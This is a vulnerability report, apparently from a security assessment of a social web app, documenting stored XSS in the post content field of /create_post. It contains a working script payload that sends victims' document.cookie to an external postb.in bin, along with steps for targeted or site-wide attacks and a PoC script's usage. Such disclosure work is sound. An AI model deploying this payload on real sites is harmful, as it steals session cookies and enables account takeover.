# Vulnerability 7: XSS in create post - content of the post can contain script which will be executed on any person viewing the post

- Vulnerability: XSS
- Where: `content` in /create_post
- Impact: Allows to run any script on person viewing the post

## Steps to reproduce

1. Create a post containing malicious script like the one below.
    If the attack is targeted the post visibility can be set to `Friends`.
    But if we want to attack everyone the post visibility can be set to `Public`.
    ```html
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://cors-anywhere.herokuapp.com/https://postb.in/1603555839181-2461015884764", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.send(JSON.stringify({
            "cookie": document.cookie
        }));
    </script>
    ```
2. If the attack is targeted - send a friend request to the victim. 
    And wait for the victim to accept the friend request.
3. When any victim opens the main page the script will be loaded as part of a post
    and will be executed. So if the script is sending data to 
    [https://postb.in](https://postb.in/1603555839181-2461015884764)
    or another server we can view the sent data there.
    

## Script usage
The script creates `postb.in` bin and sends cookies from the victim's side to the bin.
Can have both targeted (with a friend request) or attach on everyone who opens public section of posts.

```shell script
python vuln7.py <server> <target_url> <victim_username> <victim_password> <hacker_username> <hacker_password> [--attack_everyone]
python vuln7.py -h  # for more details
``` 


[(POC)](vuln7.py)
